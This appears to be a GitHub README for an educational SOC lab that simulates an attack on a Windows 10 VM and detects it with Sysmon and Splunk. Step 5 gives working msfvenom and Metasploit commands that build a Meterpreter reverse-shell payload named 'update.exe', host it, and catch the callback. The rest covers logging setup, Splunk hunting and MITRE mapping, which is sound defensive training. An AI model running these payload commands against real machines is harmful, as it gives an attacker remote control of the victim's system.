# SOC Investigation Lab: Malware Detection & Incident Response

A hands-on security operations center (SOC) investigation demonstrating end-to-end threat detection, analysis, and incident response using real attack simulation, Sysmon process monitoring, and Splunk SIEM.

## 🎯 Project Overview

This lab simulates a complete attack-to-detection workflow:
- **Attacker (Kali Linux)** generates a malicious reverse shell payload
- **Target (Windows 10)** executes the payload; Sysmon captures every process, network connection, and file activity
- **SIEM (Splunk)** ingests and indexes Sysmon/Windows Security logs
- **Analyst** hunts the incident using Splunk searches and writes a forensic report

**Result:** A production-ready incident report with timeline, IOCs, MITRE ATT&CK mapping, and remediation recommendations.

## 🛠️ Architecture

┌─────────────────┐         ┌──────────────────┐         ┌─────────────┐

│  Kali Linux     │         │   Windows 10     │         │   Splunk    │

│  192.168.1.18   │────────▶│   192.168.1.21   │────────▶│  Huawei     │

│                 │  Attack │  + Sysmon        │  Logs   │  (SIEM)     │

│ • msfvenom      │         │  + Forwarder     │ TCP:9997│             │

│ • Metasploit    │         │                  │         │ Port: 8000  │

└─────────────────┘         └──────────────────┘         └─────────────┘

## 🔍 Key Findings

### What This Lab Demonstrates

1. **Process Monitoring**: Sysmon EventID 1 captures full process lineage (parent/child), command line, file hash
2. **Network Detection**: EventID 3 logs outbound reverse shell callback with source/dest IP:port
3. **Timeline Correlation**: Splunk timestamps enable precise sequencing (attack occurred in ~2 seconds)
4. **UAC Boundaries**: Demonstrated real Windows security controls (failed privilege escalation attempts)
5. **Field Extraction Challenges**: XML-based Sysmon data requires regex for proper Splunk indexing

### Technical Insights

- **Field extraction quirk**: Sysmon XML elements (e.g., `<EventID>`) don't auto-extract as Splunk fields; requires `| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"`
- **Firewall defaults**: Both ICMP and TCP:9997 require explicit `netsh advfirewall` allow rules
- **UAC non-elevation**: Medium-integrity admin cannot create accounts; token impersonation (getsystem) failed on patched Win10 build

## 📋 Incident Report

See **[incident_report.md](./incident_report.md)** for the complete analysis, including:
- Executive summary
- Detailed timeline with Sysmon event IDs
- Indicators of compromise (IOCs)
- MITRE ATT&CK mapping (6 techniques identified)
- Detection opportunities
- Remediation steps

## 🚀 Setup Instructions

### Prerequisites
- VirtualBox or VMware Fusion
- Kali Linux ISO
- Windows 10 ISO
- 16GB+ RAM, 50GB free disk space

### Step 1: Network Configuration
Both VMs must be on the same bridged network to communicate:
```bash
# VirtualBox: Settings → Network → Bridged Adapter (select your WiFi/Ethernet)
```

Verify connectivity:
```bash
# From Kali
ping <Win10_IP>

# From Win10
ping <Kali_IP>
```

### Step 2: Sysmon & Windows Event Log Setup

**On Windows 10:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Download [SwiftOnSecurity's sysmonconfig-export.xml](https://github.com/SwiftOnSecurity/sysmon-config)
3. Install:
```powershell
.\sysmon64.exe -accepteula -i sysmonconfig-export.xml
```
4. Verify in Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational

### Step 3: Splunk Setup

**On Splunk machine:**
1. Download Splunk free license edition from [splunk.com](https://www.splunk.com/en_us/download.html)
2. Configure receiving port:
   - Settings → Forwarding and receiving → Configure receiving → New Receiving Port: 9997
3. Allow firewall:
```cmd
netsh advfirewall firewall add rule name="Splunk Receiving 9997" protocol=TCP dir=in localport=9997 action=allow
```

### Step 4: Universal Forwarder (Windows 10)

1. Download [Splunk Universal Forwarder](https://www.splunk.com/en_us/download/universal-forwarder.html)
2. Install with default options; point to indexer IP:9997
3. Create/edit `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`:
```ini
[WinEventLog://Security]
disabled = 0
index = wineventlogs

[WinEventLog://System]
disabled = 0
index = wineventlogs

[WinEventLog://Application]
disabled = 0
index = wineventlogs

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
renderXml = true
index = win_logs
```
4. Restart SplunkForwarder service

### Step 5: Run the Attack

**On Kali:**
```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o update.exe

# Host it
python3 -m http.server 8080

# In another terminal, start listener
msfconsole
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST <Kali_IP>
> set LPORT 4444
> exploit
```

**On Windows 10:**
- Browser → `http://<Kali_IP>:8080/update.exe`
- Download and execute
- Watch Meterpreter session open

### Step 6: Hunt in Splunk

```spl
index=win_logs host=DESKTOP-9BB4HVN sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| where EventID="1"
| search "update.exe"
```

## 📊 MITRE ATT&CK Coverage

This lab demonstrates **6 tactics and techniques**:
- T1566.001 - Phishing: Malicious File
- T1204.002 - User Execution: Malicious File
- T1059.003 - Command and Scripting Interpreter
- T1033 - System Information Discovery
- T1087.001 - Account Discovery
- T1136.001 - Create Account (blocked by UAC)

## 💡 Skills Demonstrated

- SIEM configuration and log ingestion (Splunk)
- Process monitoring and endpoint instrumentation (Sysmon)
- Malware simulation and exploitation (Metasploit, msfvenom)
- Log analysis and threat hunting (regex, Splunk queries)
- Timeline reconstruction and incident correlation
- MITRE ATT&CK framework mapping
- Windows security internals (UAC, privilege levels, firewall rules)
- Technical report writing for security teams

## 📁 Repository Contents

SOC-Investigation-Lab/

├── incident_report.md          # Complete incident analysis

├── README.md                   # This file

└── sysmon_config.xml          # (Optional) SwiftOnSecurity Sysmon config reference

## 🔐 Security Notes

- This lab is for **education only** on isolated networks
- Never use this attack simulation on systems you don't own
- UAC disabling and firewall rule changes should only be done in lab environments
- The malware payload is detected by real antivirus (expected and safe in VMs)

## 📚 References

- [Sysmon Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Splunk Search Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)

---

**Author:** JP13007  
**Last Updated:** June 16, 2026  
**Status:** Complete incident → detection → report workflow
